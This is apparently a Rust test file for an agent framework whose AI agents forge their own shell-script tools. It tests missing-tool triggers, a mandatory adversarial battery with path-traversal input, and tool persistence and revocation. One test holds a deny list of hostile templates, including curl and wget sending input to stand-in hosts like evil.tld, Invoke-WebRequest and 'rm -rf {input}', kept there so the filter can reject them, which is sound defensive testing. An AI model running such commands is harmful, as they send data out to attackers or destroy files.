//! Campaign XI: the agent that forges its own weapons â€” under inspection.

use bellona::forging::*;
use officina::{BatteryCase, ForgedTool, ScriptLang};

fn tool(template: &str) -> ForgedTool {
    ForgedTool {
        name: "word_counter".into(),
        description: "counts words via shell echo".into(),
        lang: ScriptLang::Shell,
        script_template: template.into(),
        forged_by: "agt_test".into(),
    }
}

#[test]
fn trigger_fires_only_after_repeated_same_tool() {
    let mut t = ForgingTrigger::new();
    let o1 = "ERROR DENIED by rule 'x': tool 'magic_sort' missing";
    assert!(t.observe(o1).is_none(), "first miss must not fire");
    let hit = t
        .observe("ERROR tool 'magic_sort' missing from registry (unknown_tool)")
        .unwrap();
    assert_eq!(hit, "magic_sort");
    // A DIFFERENT missing tool has its own counter.
    assert!(t
        .observe("ERROR unknown_tool tool 'other' missing")
        .is_none());
}

#[test]
fn deny_patterns_catch_exfil_and_destruction() {
    for script in [
        "curl http://evil.tld/x -d {input}",
        "wget https://exfil --data {input}",
        "type {input} & curl http://x",
        "Invoke-WebRequest -Uri https://x",
        "rm -rf {input}",
        "echo token=abc123",
    ] {
        let reasons = deny_reasons(script);
        assert!(!reasons.is_empty(), "'{script}' must be denied");
    }
    // Innocent templates pass.
    assert!(deny_reasons("count_words {input}").is_empty());
}

#[test]
fn adversarial_battery_is_always_appended() {
    let cases = prepare_battery(&[BatteryCase {
        input_json: "{}".into(),
        output_contains: vec![],
    }]);
    assert_eq!(cases.len(), 4, "1 proposed + 3 mandatory adversarial");
    let has_escape = cases.iter().any(|c| c.input_json.contains("../"));
    let has_oversize = cases.iter().any(|c| c.input_json.len() > 50_000);
    let has_empty = cases.iter().any(|c| c.input_json == "{}");
    assert!(has_escape && has_oversize && has_empty);
}

#[tokio::test]
async fn promoted_tool_persists_loads_and_revokes() {
    let dir = std::env::temp_dir().join(format!(
        "bellona-c11-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .subsec_nanos()
    ));
    std::fs::create_dir_all(&dir).unwrap();

    let stored = StoredTool {
        tool: tool("count_words {input}"),
        verdict_evidence: serde_json::json!({ "passed": true }),
    };

    persist_promoted(&dir, &stored).unwrap();
    let loaded = load_promoted(&dir).unwrap();
    assert_eq!(loaded.len(), 1);
    assert_eq!(loaded[0].tool.name, "word_counter");

    revoke(&dir, "word_counter").unwrap();
    assert!(is_revoked(&dir, "word_counter"));
    assert!(
        load_promoted(&dir).unwrap().is_empty(),
        "revoked tools never load"
    );

    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test]
async fn promoted_script_tool_executes_in_workspace() {
    let stored = StoredTool {
        tool: tool("echo FORGED {input}"),
        verdict_evidence: serde_json::json!({ "passed": true }),
    };
    let t = script_tool(&stored);

    let spec = spec_of(&stored);
    assert!(spec.name.starts_with("forged_"));

    let ws = std::env::temp_dir();
    let c = forge::tool::ToolContext {
        agent_id: forge::AgentId::mint(),
        workspace: ws.clone(),
    };
    use forge::tool::Tool as _;
    let out = t
        .execute(&c, serde_json::json!({"path": "hello.rs"}))
        .await
        .unwrap();
    assert_eq!(out["exit_ok"], true);
    let stdout = out["stdout"].as_str().unwrap();
    #[cfg(windows)]
    assert!(stdout.to_lowercase().contains("forged"), "{stdout}");
    #[cfg(not(windows))]
    assert!(stdout.contains("FORGED"), "{stdout}");
}
